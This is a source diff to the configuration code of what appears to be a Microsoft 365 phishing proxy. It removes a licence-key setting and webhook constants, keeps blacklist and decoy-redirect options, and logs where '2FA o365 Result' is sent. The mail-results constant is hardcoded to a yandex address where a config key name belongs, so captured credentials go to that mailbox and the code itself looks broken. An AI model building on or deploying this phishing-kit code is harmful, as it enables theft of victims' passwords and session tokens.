@@ -36,7 +36,6 @@ type Config struct {
 	proxyPassword     string
 	blackListMode     string
 	mailResults       string
-	key               string
 	proxyEnabled      bool
 	sitesEnabled      map[string]bool
 	sitesHidden       map[string]bool
@@ -71,9 +70,6 @@ const (
 	CFG_PROXY_ENABLED      = "proxy_enabled"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
 	CFG_MAIL_RESULTS       = "jackrodney@yandex.com"
-// 	CFG_WEBHOOK_URL        = "webhook_url"
-// 	CFG_WEBHOOK_PARAM      = "webhook_param"
-	CFG_KEY                = "none"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -129,7 +125,6 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
 	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
 	c.mailResults = c.cfg.GetString(CFG_MAIL_RESULTS)
-	c.key = c.cfg.GetString(CFG_KEY)
 	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
 
 	for _, site := range s_enabled {
@@ -400,13 +395,6 @@ func (c *Config) SetResultMode(email string) {
 	log.Info("2FA o365 Result will send to: %s", email)
 }
 
-func (c *Config) SetKey(key string) {
-	c.key = key
-	c.cfg.Set(CFG_KEY, key)
-	c.cfg.WriteConfig()
-	log.Info("Successfully set Key: %s", key)
-}
-
 func (c *Config) SetVerificationParam(param string) {
 	c.verificationParam = param
 	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
@@ -586,8 +574,4 @@ func (c *Config) GetBlacklistMode() string {
 
 func (c *Config) GetMailResult() string {
 	return c.mailResults
-}
-
-func (c *Config) GetKey() string {
-	return c.key
 }
